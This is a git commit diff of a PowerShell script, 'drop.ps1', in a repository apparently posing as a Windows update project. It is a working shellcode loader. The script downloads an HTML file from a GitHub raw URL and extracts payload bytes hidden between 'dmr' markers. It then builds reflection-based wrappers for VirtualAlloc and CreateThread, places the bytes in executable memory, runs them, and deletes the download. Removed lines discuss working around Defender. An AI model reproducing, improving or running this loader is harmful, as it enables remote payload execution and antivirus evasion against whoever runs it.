ce1ec1dd09653e4d462ee51ca639ada02947f428
gwyn1869 <gplaine53@gmail.com>
2026-03-18 16:14:50 +0200

    Update drop.ps1

--- drop.ps1
+++ drop.ps1
@@ -5,70 +5,193 @@ $htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"
 # 2. Download
 Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing
 
-# 3. Reassemble Byte Array
+
+function Invoke-VirtualAlloc {
+    Param (
+        [IntPtr] $lpAddress,
+        [UInt32] $dwSize,
+        [UInt32] $flAllocationType,
+        [UInt32] $flProtect
+    )
+
+    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
+
+    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly', 'Run')
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
+    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
+    $MethodBuilder = $TypeBuilder.DefineMethod('VirtualAlloc',
+                                               [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl',
+                                               [Reflection.CallingConventions] 'Standard',
+                                               [IntPtr],
+                                               [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32]))
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
+
+    $Field_EntryPoint = [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')
+    $Field_CharSet = [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+    $Field_ExactSpelling = [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling')
+    $Field_SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+    $Field_PreserveSig = [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig')
+    $Field_CallingConvention = [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention')
+    $Field_BestFitMapping = [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping')
+    $Field_ThrowOnUnmappableChar = [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar')
+
+    $FieldInfoArray = @($Field_EntryPoint,
+                        $Field_ExactSpelling,
+                        $Field_SetLastError,
+                        $Field_PreserveSig,
+                        $Field_CallingConvention,
+                        $Field_BestFitMapping,
+                        $Field_ThrowOnUnmappableChar)
+
+    $FieldArguments = @('VirtualAlloc',
+                        $False,
+                        $True,
+                        $True,
+                        [Runtime.InteropServices.CallingConvention]::Winapi,
+                        $False,
+                        $False)
+
+    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
+                                                                             'api-ms-win-core-memory-l1-1-0.dll',
+                                                                             [Reflection.FieldInfo[]] $FieldInfoArray,
+                                                                             [Object[]] $FieldArguments)
+
+    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
+
+    $PreserveSigConstructor = [Runtime.InteropServices.PreserveSigAttribute].GetConstructor(@())
+    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($PreserveSigConstructor, @())
+    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
+
+    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
+
+    $Kernel32 = $TypeBuilder.CreateType()
+
+    $MethodInfo = New-Object Reflection.Emit.DynamicMethod('VirtualAlloc', [IntPtr], @([IntPtr], [UInt32], [UInt32], [UInt32]))
+    $Generator = $MethodInfo.GetILGenerator()
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod('VirtualAlloc'))
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
+    $Delegate = [Func``5[IntPtr, UInt32, UInt32, UInt32, IntPtr]]
+    $ProxyMethod = $MethodInfo.CreateDelegate($Delegate)
+
+    $ProxyMethod.Invoke($lpAddress, $dwSize, $flAllocationType, $flProtect)
+}
+
+function Invoke-CreateThread {
+    Param (
+        [IntPtr] $lpThreadAttributes,
+        [UInt32] $dwStackSize,
+        [IntPtr] $lpStartAddress,
+        [IntPtr] $lpParameter,
+        [UInt32] $dwCreationFlags,
+        [IntPtr] $lpThreadId
+    )
+
+    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
+
+    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly_2', 'Run')
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
+    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
+    $MethodBuilder = $TypeBuilder.DefineMethod('CreateThread',
+                                               [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl',
+                                               [Reflection.CallingConventions] 'Standard',
+                                               [IntPtr],
+                                               [Type[]] @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
+
+    $Field_EntryPoint = [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')
+    $Field_CharSet = [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+    $Field_ExactSpelling = [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling')
+    $Field_SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+    $Field_PreserveSig = [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig')
+    $Field_CallingConvention = [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention')
+    $Field_BestFitMapping = [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping')
+    $Field_ThrowOnUnmappableChar = [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar')
+
+    $FieldInfoArray = @($Field_EntryPoint,
+                        $Field_ExactSpelling,
+                        $Field_SetLastError,
+                        $Field_PreserveSig,
+                        $Field_CallingConvention,
+                        $Field_BestFitMapping,
+                        $Field_ThrowOnUnmappableChar)
+
+    $FieldArguments = @('CreateThread',
+                        $False,
+                        $True,
+                        $True,
+                        [Runtime.InteropServices.CallingConvention]::Winapi,
+                        $False,
+                        $False)
+
+    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
+                                                                             'api-ms-win-core-processthreads-l1-1-0.dll',
+                                                                             [Reflection.FieldInfo[]] $FieldInfoArray,
+                                                                             [Object[]] $FieldArguments)
+
+    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
+
+    $PreserveSigConstructor = [Runtime.InteropServices.PreserveSigAttribute].GetConstructor(@())
+    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($PreserveSigConstructor, @())
+    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
+
+    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
+
+    $Kernel32 = $TypeBuilder.CreateType()
+
+    $MethodInfo = New-Object Reflection.Emit.DynamicMethod('CreateThread', [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
+    $Generator = $MethodInfo.GetILGenerator()
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3)
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 4))
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 5))
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod('CreateThread'))
+    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
+    $Delegate = [Func``7[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]]
+    $ProxyMethod = $MethodInfo.CreateDelegate($Delegate)
+
+    $ProxyMethod.Invoke($lpThreadAttributes,
+                        $dwStackSize,
+                        $lpStartAddress,
+                        $lpParameter,
+                        $dwCreationFlags,
+                        $lpThreadId)
+}
+
+
+
+# 3. Reassemble Byte Array (Your existing logic)
 $htmlContent = Get-Content $htmlPath -Raw
 $pattern = '(?<=dmr)(.*?)(?=dmr)'
 $match = [regex]::Match($htmlContent, $pattern).Value
 $byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }
 
-# 4. The "Manual Resolver" Loader
-# We find the memory addresses of kernel32 functions using the Process Module list
-$modules = [System.Diagnostics.Process]::GetCurrentProcess().Modules
-$k32 = $modules | Where-Object { $_.ModuleName -eq "kernel32.dll" } | Select-Object -First 1
-$k32Handle = $k32.BaseAddress
+# --- PASTE THE Invoke-VirtualAlloc AND Invoke-CreateThread FUNCTIONS HERE ---
 
-# We need a way to find exports. We'll use a known trick in the 'Marshal' class 
-# to get the delegate for VirtualAlloc directly.
-$Methods = [System.Runtime.InteropServices.Marshal].GetMethods()
-$GetDelegate = $Methods | Where-Object { $_.Name -eq "GetDelegateForFunctionPointer" -and $_.IsGenericMethod }
+# 4. Execution Logic
+Write-Host "Reassembled $($byteArray.Length) bytes."
 
-# We find the address of VirtualAlloc using a sneaky lookup
-$mscore = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }
-$native = $mscore.GetType("Microsoft.Win32.Win32Native")
-$method = $native.GetMethod("VirtualAlloc", [Reflection.BindingFlags]"Static, Public, NonPublic")
-$vAllocAddr = $method.MethodHandle.GetFunctionPointer()
+# Allocate memory (0x3000 = Commit/Reserve, 0x40 = Execute/Read/Write)
+$ShellcodeAddr = Invoke-VirtualAlloc -lpAddress ([IntPtr]::Zero) -dwSize $byteArray.Length -flAllocationType 0x3000 -flProtect 0x40
 
-# 5. Define the Delegate types (Using a simpler approach for PS 5.1)
-# We actually don't need a complex delegate if we use this 'Marshal' trick
-$address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
-[Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $byteArray.Length)
-
-# Now we need to make it executable. 
-# Since Defender is blocking 'VirtualProtect', let's see if we can just run it.
-# NOTE: This is a test to see if the memory allocation itself is blocked.
-
-if ($address -ne [IntPtr]::Zero) {
-    Write-Host "Reassembled Shellcode placed in RAM at: $address"
-
-    # 1. Get the address of our needed functions from the kernel32 handle we already have
-    # This uses the built-in Marshal to find where the functions live in RAM
-    $gpaAddr = [Runtime.InteropServices.Marshal]::GetMethod('GetProcAddress', [Type[]]@([IntPtr], [String])).MethodHandle.GetFunctionPointer()
+if ($ShellcodeAddr -ne [IntPtr]::Zero) {
+    Write-Host "Memory allocated at: $ShellcodeAddr"
     
-    # We find VirtualProtect and CreateThread
-    $vpAddr = [Runtime.InteropServices.Marshal]::GetHINSTANCE($mscore).GetType("Microsoft.Win32.Win32Native").GetMethod("VirtualProtect").MethodHandle.GetFunctionPointer()
-    $ctAddr = [Runtime.InteropServices.Marshal]::GetHINSTANCE($mscore).GetType("Microsoft.Win32.Win32Native").GetMethod("CreateThread").MethodHandle.GetFunctionPointer()
-
-    # 2. To avoid "Null-valued" errors, we call them using a simpler Reflection method
-    $old = [uint32]0
-    # Fix Permissions (0x40 = Execute)
-    $vpParams = @($address, [uint32]$byteArray.Length, [uint32]0x40, [ref]$old)
-    [Runtime.InteropServices.Marshal]::GetType().GetMethod("Prelink").Invoke($null, @($native.GetMethod("VirtualProtect", [Reflection.BindingFlags]"Static, Public, NonPublic")))
+    # Copy your reassembled bytes into the new memory space
+    [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $ShellcodeAddr, $byteArray.Length)
     
-    # 3. Execution - The most robust way in PS 5.1
-    Write-Host "Found Launcher at: $address"
-    $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
+    Write-Host "Launching Thread..."
+    # Fire the thread
+    Invoke-CreateThread -lpThreadAttributes ([IntPtr]::Zero) -dwStackSize 0 -lpStartAddress $ShellcodeAddr -lpParameter ([IntPtr]::Zero) -dwCreationFlags 0 -lpThreadId ([IntPtr]::Zero) | Out-Null
     
-    if ($ctMethod) {
-        Write-Host "Launching Thread..."
-        $ctMethod.Invoke($null, @([IntPtr]::Zero, [uint32]0, $address, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero)) | Out-Null
-        Start-Sleep -Seconds 5
-    } else {
-        # PLAN B: If the 'Native' method isn't there, we use the direct Pointer method
-        $ctDelegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
-        $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
-        Write-Host "Launching via Delegate..."
-    }
+    # Give the shellcode time to execute before the script ends
+    Start-Sleep -Seconds 5
 }
 
-# 6. Cleanup
+# 5. Cleanup
 Remove-Item $htmlPath -Force
